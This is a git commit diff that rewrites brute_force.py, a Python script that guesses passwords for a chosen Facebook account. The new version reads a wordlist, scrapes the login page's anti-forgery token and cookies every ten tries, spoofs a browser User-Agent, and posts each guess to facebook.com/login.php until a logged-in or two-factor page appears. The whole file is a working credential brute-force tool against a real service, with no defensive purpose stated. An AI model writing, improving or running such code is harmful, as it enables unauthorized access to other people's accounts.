9744c12abe429d24ab74874e00375205f778e5fc
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-23 11:29:25 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,46 +1,70 @@
+import os.path
 import requests
+from bs4 import BeautifulSoup
+import sys
 
-# Function to perform brute force attack without proxy
-def brute_force(username, fb_id, passwords):
-    for password in passwords:
-        try:
-            # Example: Make a request to Facebook login without using a proxy
-            result = requests.post('https://www.facebook.com/login.php',
-                                   data={'email': username, 'pass': password},
-                                   timeout=10)
+if sys.version_info[0] != 3:
+    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
+    fb.py\n\t--------------------------------------''')
+    sys.exit()
 
-            # Check if CAPTCHA is triggered
-            if 'captcha' in result.text.lower():
-                print("CAPTCHA triggered. Aborting brute-force.")
-                break
+PASSWORD_FILE = "passwords.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+PAYLOAD = {}
+COOKIES = {}
 
-            # Check if login was successful (customize based on Facebook's response)
-            if 'Welcome to Facebook' in result.text:
-                print(f"Login successful! Username: {username}, Password: {password}")
-                break
-            else:
-                print(f"Login failed for Password: {password}")
 
-        except requests.exceptions.RequestException as e:
-            print(f"Request Error: {e}")
-            # Handle specific errors if needed
+def create_form():
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
 
-# Function to read passwords from a file
-def read_passwords(file_path):
-    with open(file_path, 'r') as file:
-        return file.read().splitlines()
+    try:
+        data = requests.get(POST_URL, headers=HEADERS)
+        for i in data.cookies:
+            cookies[i.name] = i.value
+        data = BeautifulSoup(data.text, 'html.parser').form
+        if data.input['name'] == 'lsd':
+            form['lsd'] = data.input['value']
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
+    return form, cookies
 
-# Function to execute the main brute-force attack
-def main():
-    username = input("Enter email address (as username): ")
-    fb_id = input("Enter Facebook ID: ")
-    password_file = input("Enter the password file name: ")
 
-    # Read passwords from file
-    passwords = read_passwords(password_file)
+def is_this_a_password(email, index, password):
+    global PAYLOAD, COOKIES
+    if index % 10 == 0:
+        PAYLOAD, COOKIES = create_form()
+        PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
 
-    # Perform brute-force attack
-    brute_force(username, fb_id, passwords)
+    try:
+        r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+        if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+            open('temp', 'w').write(str(r.content))
+            print('\npassword found is: ', password)
+            return True
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
 
-if __name__ == '__main__':
-    main()
+    return False
+
+
+if __name__ == "__main__":
+    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    if not os.path.isfile(PASSWORD_FILE):
+        print("Password file is not exist: ", PASSWORD_FILE)
+        sys.exit(0)
+    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    print("Password file selected: ", PASSWORD_FILE)
+    email = input('Enter Email/Username to target: ').strip()
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print("Trying password [", index, "]: ", password)
+        if is_this_a_password(email, index, password):
+            break
